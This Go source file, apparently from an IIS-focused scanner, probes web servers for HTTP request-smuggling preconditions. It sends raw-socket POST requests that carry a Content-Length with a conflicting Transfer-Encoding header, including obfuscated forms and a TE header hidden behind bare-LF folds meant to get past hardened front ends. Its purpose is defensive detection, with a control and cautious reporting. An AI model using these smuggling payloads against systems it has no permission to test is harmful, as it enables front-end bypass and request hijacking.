package shortscan

import (
	"fmt"
	"net"
	"net/http"
	nurl "net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
)

// desyncStats is the current scan's stats sink for raw-socket / ALPN-h2 desync
// probes, which bypass the counted HTTP client. Assigned once at scan startup (see
// runDesyncProbe/runDesyncAuto) so teDesyncProbe/h2ProbeVia can fold their request
// count into the honest final "Requests: N" line; nil (no-op) if never set.
// Holds a *httpStats (or nil): --parallel runs one goroutine per host, and each
// calls setDesyncStats once, so this needs atomic access rather than a bare var —
// the underlying *httpStats itself is already mutex-guarded, only the pointer
// swap/read needs to be race-free.
var desyncStats atomic.Value

// countDesyncProbe records one raw desync probe request against the active scan's stats.
func countDesyncProbe() {
	if st, ok := desyncStats.Load().(*httpStats); ok && st != nil {
		st.addRequests(1)
	}
}

// setDesyncStats wires the scan's stats sink for the raw-socket desync probes.
func setDesyncStats(st *httpStats) {
	if st != nil {
		desyncStats.Store(st)
	}
}

// TE.CL / bare-LF request-smuggling precondition detector.
//
// A back-end that frames a request by Transfer-Encoding while a Content-Length
// header coexists — instead of rejecting the pair with 400, which RFC 9112 §6.1
// says such a message "ought to be handled as an error" — desyncs from a front end
// (WAF/CDN/LB) that frames by CL. The attacker then smuggles a second request the
// front end never inspects. Confirmed on IIS 10 / HTTP.sys: it forwards CL+TE and
// frames by TE, including obfuscated TE forms (tab before the value, "identity,
// chunked") that a stricter front end may not recognize as chunked at all.
//
// HTTP.sys also treats a BARE LF ("\n" with no preceding CR) as a header line
// terminator. That lets the Transfer-Encoding header be HIDDEN behind a bare-LF
// fold: a CRLF-strict front end reads "X-Pad: p\nTransfer-Encoding: chunked" as a
// single header VALUE and never sees a TE header at all, so it frames by CL; but
// http.sys splits on the LF, parses the TE, and frames by chunked. This desync
// survives a front end that has been hardened against classic TE+CL smuggling,
// because from the front end's view there is no TE/CL conflict to normalize.
//
// The probe is READ-ONLY: the smuggled second request is a plain "GET /". Each
// variant sends its header block over a raw socket; the trailing "GET /" forms a
// valid second request ONLY if the body was TE-framed (the 0-chunk terminator was
// consumed), producing a second 200. A pure-CL control (no TE) MUST NOT smuggle —
// so a normalizing / non-vulnerable back end is never misreported as vulnerable.

// desyncVariant describes one framing trick. build returns the full header block
// that follows the request line (the Host line through the terminating blank
// line), with host interpolated. hidden marks variants where the TE header is
// invisible to a CRLF-strict front end (strictly stronger than plain TE.CL).
type desyncVariant struct {
	label  string
	hidden bool
	build  func(host string) string
}

// desyncControlBlock is the honest control: a plain CL=6 request with no TE and no
// bare-LF trick. Its leftover "ET /" is a bad method, so it must NOT smuggle.
func desyncControlBlock(host string) string {
	return "Host: " + host + "\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\n"
}

var desyncVariants = []desyncVariant{
	{"TE: chunked", false, func(h string) string {
		return "Host: " + h + "\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
	}},
	{"TE: <tab>chunked", false, func(h string) string {
		return "Host: " + h + "\r\nContent-Length: 6\r\nTransfer-Encoding:\tchunked\r\nConnection: keep-alive\r\n\r\n"
	}},
	{"TE: identity, chunked", false, func(h string) string {
		return "Host: " + h + "\r\nContent-Length: 6\r\nTransfer-Encoding: identity, chunked\r\nConnection: keep-alive\r\n\r\n"
	}},
	// Bare-LF-hidden TE: the front end (CRLF-strict) folds these into a header
	// value and never sees a TE header; http.sys splits on the LF and frames by it.
	{"TE hidden behind bare-LF fold", true, func(h string) string {
		return "Host: " + h + "\r\nContent-Length: 6\r\nX-Pad: p\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
	}},
	{"TE after bare-LF (CL<LF>TE)", true, func(h string) string {
		return "Host: " + h + "\r\nContent-Length: 6\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
	}},
}

// teDesyncProbe sends "POST <path> HTTP/1.1\r\n" + headerBlock + a body whose
// leftover forms a "GET /", and returns the status line of each response.
// headerBlock is the full block after the request line (Host line through the
// terminating blank line), letting a variant embed a bare LF a CRLF parser hides.
func teDesyncProbe(hostPort, host, headerBlock string) ([]string, error) {
	countDesyncProbe()
	delayRequest() // raw-socket probe: still bound by --rate like every fetch()-based request
	conn, err := net.DialTimeout("tcp", hostPort, 8*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))

	// body: an empty chunked terminator then a clean "GET /". TE framing consumes
	// "0\r\n\r\n" and the "GET /" forms request #2; CL=6 framing consumes the first
	// 6 bytes ("0\r\n\r\nG") and leaves "ET /" — a bad method, no smuggle.
	body := "0\r\n\r\nGET / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n"
	req := "POST /shortscan-desync-probe HTTP/1.1\r\n" + headerBlock + body
	if _, err = conn.Write([]byte(req)); err != nil {
		return nil, err
	}
	buf := make([]byte, 4096)
	var out []byte
	for {
		n, e := conn.Read(buf)
		out = append(out, buf[:n]...)
		if e != nil || len(out) > 16384 {
			break
		}
	}
	var statuses []string
	for _, part := range strings.Split(string(out), "HTTP/1.1 ")[1:] {
		statuses = append(statuses, strings.SplitN(part, "\r\n", 2)[0])
	}
	return statuses, nil
}

// teExpectedSecondStatus calibrates the response to the exact clean request that
// the TE-framed probe leaves behind. A valid second request may legitimately be a
// redirect or authentication wall; requiring 200 would miss those hosts.
func teExpectedSecondStatus(hostPort, host string) (string, error) {
	countDesyncProbe()
	delayRequest()
	conn, err := net.DialTimeout("tcp", hostPort, 8*time.Second)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))
	if _, err := conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nConnection: close\r\n\r\n")); err != nil {
		return "", err
	}
	buf := make([]byte, 4096)
	var out []byte
	for {
		n, e := conn.Read(buf)
		out = append(out, buf[:n]...)
		if e != nil || len(out) > 16384 {
			break
		}
	}
	parts := strings.Split(string(out), "HTTP/1.1 ")
	if len(parts) < 2 {
		return "", fmt.Errorf("calibration returned no HTTP/1.1 status")
	}
	return strings.SplitN(parts[1], "\r\n", 2)[0], nil
}

// finalStatuses drops 1xx interim responses (e.g. "100 Continue"), which are not
// answers to a request. Some stacks emit one before the real response; left in, it
// shifts the smuggle-slot index and can fake or hide the calibrated second response.
func finalStatuses(statuses []string) []string {
	out := make([]string, 0, len(statuses))
	for _, s := range statuses {
		if strings.HasPrefix(s, "1") { // 1xx interim, never a final response here
			continue
		}
		out = append(out, s)
	}
	return out
}

// teFramed reports whether the second response matches the separately calibrated
// clean GET / response — i.e. the leftover request was processed intact, proving
// the body was framed by TE rather than CL. The variadic default preserves the
// legacy 200 expectation for focused unit tests.
// Interim 1xx responses are filtered first so a "100 Continue" can neither fake nor
// mask the second-response slot.
func teFramed(statuses []string, expected ...string) bool {
	f := finalStatuses(statuses)
	if len(f) < 2 {
		return false
	}
	want := "200"
	if len(expected) > 0 && expected[0] != "" {
		want = expected[0]
	}
	return statusCode(f[1]) == statusCode(want)
}

func statusCode(status string) string {
	status = strings.TrimSpace(status)
	if len(status) < 3 {
		return status
	}
	return status[:3]
}

// desyncH1Detect runs the pure-CL control then every variant and returns which
// desync the back end, WITHOUT printing. ctrlOK is false if the host is unreachable
// or the control itself smuggles (inconclusive). Shared by --desync-probe (verbose)
// and --auto (quiet).
func desyncH1Detect(hostPort, host string) (plain, hidden []string, ctrlOK bool) {
	expected, err := teExpectedSecondStatus(hostPort, host)
	if err != nil {
		return nil, nil, false
	}
	ctrl, err := teDesyncProbe(hostPort, host, desyncControlBlock(host))
	if err != nil || teFramed(ctrl, expected) {
		return nil, nil, false
	}
	ctrlOK = true
	for _, v := range desyncVariants {
		st, err := teDesyncProbe(hostPort, host, v.build(host))
		if err != nil {
			continue
		}
		if teFramed(st, expected) {
			if v.hidden {
				hidden = append(hidden, v.label)
			} else {
				plain = append(plain, v.label)
			}
		}
	}
	return plain, hidden, ctrlOK
}

var (
	desyncMu   sync.Mutex
	desyncDone = map[string]bool{}
)

// runDesyncAuto runs the desync precondition check once per host under --auto/--full,
// printing ONLY when a precondition is found (silent on a safe/unreachable host, like
// --source-probe's quiet mode). Full per-variant detail stays behind explicit
// --desync-probe. http origins get the h1 TE.CL/bare-LF probe; https origins get the
// HTTP/2 leniency probe.
func runDesyncAuto(rawurl string, st *httpStats) {
	u, err := nurl.Parse(rawurl)
	if err != nil || u.Host == "" {
		return
	}
	key := u.Scheme + "://" + u.Host
	desyncMu.Lock()
	if desyncDone[key] {
		desyncMu.Unlock()
		return
	}
	desyncDone[key] = true
	desyncMu.Unlock()
	setDesyncStats(st)

	if u.Scheme == "https" {
		hp := h2HostPort(u.Host)
		// desyncH2Detect already excludes front-end-rejected (benign) inputs — only
		// inputs that actually reached the origin come back, so silence here means
		// the endpoint is clean, not that the reachability check was skipped.
		accepted := desyncH2Detect(u.Hostname(), hp)
		if len(accepted) == 0 {
			return
		}
		tag := color.New(color.FgHiYellow, color.Bold).Sprint("[DESYNC-PRECOND] ")
		// A real h2->h1 request-line split IS a confirmed finding — surface it loudly
		// no matter the verbosity. The bare precondition (origin-side leniency only)
		// collapses to one compact line unless -v is set.
		var verdict, detail string
		if anyContains(accepted, "space in :path") {
			verdict, detail = h2ConfirmPathSplit(u.Hostname(), hp)
		}
		confirmedSplit := verdict == "confirmed-split"
		if args.Verbosity == 0 && !confirmedSplit {
			printHumanFooter(tag, u.Host, color.HiBlackString("origin-side h2 leniency only (%d illegal input(s)); needs a front end that reserializes to h1. -v or --desync-probe %s", len(accepted), key))
			return
		}
		printHumanFooter(tag, u.Host)
		printHumanFooter(color.HiYellowString("    [H2] PRECONDITION — %d RFC 9113-illegal input(s) reach the origin over h2: %s.", len(accepted), strings.Join(h2ShortLabels(accepted), ", ")))
		if confirmedSplit {
			printHumanFooter(color.HiRedString("    [H2→H1 SPLIT] %s — %s. A REAL request-line split against the IIS backend. Full detail: --desync-probe %s", verdict, detail, key))
		} else {
			printHumanFooter(color.HiBlackString("    Exploitable only if a front end reserializes these raw into the h1 request. Full detail: --desync-probe %s", key))
		}
		return
	}
	hostPort := u.Host
	if u.Port() == "" {
		hostPort += ":80"
	}
	plain, hidden, ctrlOK := desyncH1Detect(hostPort, u.Hostname())
	if !ctrlOK || (len(plain) == 0 && len(hidden) == 0) {
		return
	}
	tag := color.New(color.FgHiYellow, color.Bold).Sprint("[DESYNC-PRECOND] ")
	conds := make([]string, 0, 2)
	if len(plain) > 0 {
		conds = append(conds, "TE.CL")
	}
	if len(hidden) > 0 {
		conds = append(conds, "bare-LF")
	}
	if args.Verbosity == 0 {
		// Default: one compact line. This is only the back-end half of the chain
		// and grants nothing on its own; the full breakdown lives behind -v and
		// --desync-probe, so it never walls the per-host output during a scan.
		printHumanFooter(tag, u.Host, color.HiBlackString("back-end half only (%s); not a confirmed desync, needs a CL-framing front end. -v or --desync-probe %s", strings.Join(conds, "+"), key))
		return
	}
	printHumanFooter(tag, u.Host)
	if len(plain) > 0 {
		printHumanFooter(color.HiYellowString("    [TE.CL] back end prefers Transfer-Encoding over a coexisting Content-Length via: %s", strings.Join(plain, ", ")))
	}
	if len(hidden) > 0 {
		printHumanFooter(color.HiYellowString("    [BARE-LF] http.sys splits headers on a bare LF, hiding the TE from a CRLF front end via: %s", strings.Join(hidden, ", ")))
	}
	printHumanFooter(color.HiBlackString("    PRECONDITION only, not a confirmed desync: this is just the back-end half of the chain (the endpoint answering here may itself be a front end). Exploitable ONLY if a front end frames by CL / forwards the bare LF unchanged; a TE-preferring back end alone is RFC-compliant and not a vuln. Verify end-to-end against the real front end. Detail: --desync-probe %s", key))
}

// runDesyncProbe drives --desync-probe: for each target it runs the pure-CL control
// then each variant, and reports which spellings desync the back-end.
func runDesyncProbe(urls []string, _ *http.Client, st *httpStats) {
	setDesyncStats(st)
	for _, raw := range urls {
		u, err := nurl.Parse(raw)
		if err != nil || u.Host == "" {
			printHuman(color.HiBlackString("[DESYNC] skip %q (not a URL)", raw))
			continue
		}
		hostPort := u.Host
		if u.Port() == "" {
			if u.Scheme == "https" {
				hostPort += ":443"
			} else {
				hostPort += ":80"
			}
		}
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("[DESYNC] "), u.Host)

		// HTTPS: the h1 TE/bare-LF raw-socket probe isn't run over TLS; instead probe
		// the HTTP/2 origin-side leniencies (h2->h1 downgrade-desync preconditions).
		if u.Scheme == "https" {
			runH2DesyncProbe(u.Hostname(), h2HostPort(u.Host))
			continue
		}

		// Control: pure CL (no TE) must NOT smuggle — validates the test is honest.
		expected, calibrationErr := teExpectedSecondStatus(hostPort, u.Hostname())
		if calibrationErr != nil {
			printHuman(color.HiBlackString("    unable to calibrate clean GET / response: %v", calibrationErr))
			continue
		}
		ctrl, err := teDesyncProbe(hostPort, u.Hostname(), desyncControlBlock(u.Hostname()))
		if err != nil {
			printHuman(color.HiBlackString("    unreachable: %v", err))
			continue
		}
		if teFramed(ctrl, expected) {
			printHuman(color.HiBlackString("    control (pure CL) already yields the calibrated 2nd response — back end re-syncs on any method-looking bytes; result inconclusive: %v", ctrl))
			continue
		}
		printHuman(color.HiBlackString("    control (pure CL): %v — good (no false smuggle)", ctrl))

		var plain, hidden []string
		for _, v := range desyncVariants {
			st, err := teDesyncProbe(hostPort, u.Hostname(), v.build(u.Hostname()))
			if err != nil {
				continue
			}
			if teFramed(st, expected) {
				tag := "TE-framed (CL ignored) — precondition"
				if v.hidden {
					tag = "TE-framed AND hidden from a CRLF front end — precondition (would defeat TE+CL hardening IF a front end forwards the bare LF)"
					hidden = append(hidden, v.label)
				} else {
					plain = append(plain, v.label)
				}
				printHuman(color.HiYellowString("    %-32s -> %v  <<< %s", v.label, st, tag))
			} else {
				printHuman(color.HiBlackString("    %-32s -> %v", v.label, st))
			}
		}
		if len(plain) > 0 || len(hidden) > 0 {
			if len(plain) > 0 {
				printHuman(color.HiYellowString("    [TE.CL precondition] back end prefers Transfer-Encoding over a coexisting Content-Length via: %s", strings.Join(plain, ", ")))
			}
			if len(hidden) > 0 {
				printHuman(color.HiYellowString("    [BARE-LF precondition] http.sys splits headers on a bare LF, hiding the TE header from a CRLF front end via: %s", strings.Join(hidden, ", ")))
				printHuman(color.HiBlackString("    If a front end forwards the bare LF unchanged, this would survive TE+CL hardening — it never sees a TE header to reject."))
			}
			printHuman(color.HiYellowString("    PRECONDITION, not a confirmed desync: RFC-compliant TE-preference by itself is not a vuln, and the endpoint answering here may already be a front end. It is exploitable only end-to-end, against a front end that frames by CL / forwards the bare LF. Confirm against the real front end before reporting."))
		} else {
			printHuman(color.HiBlackString("    no desync (back end rejects CL+TE / bare-LF or frames by CL)"))
		}
	}
}
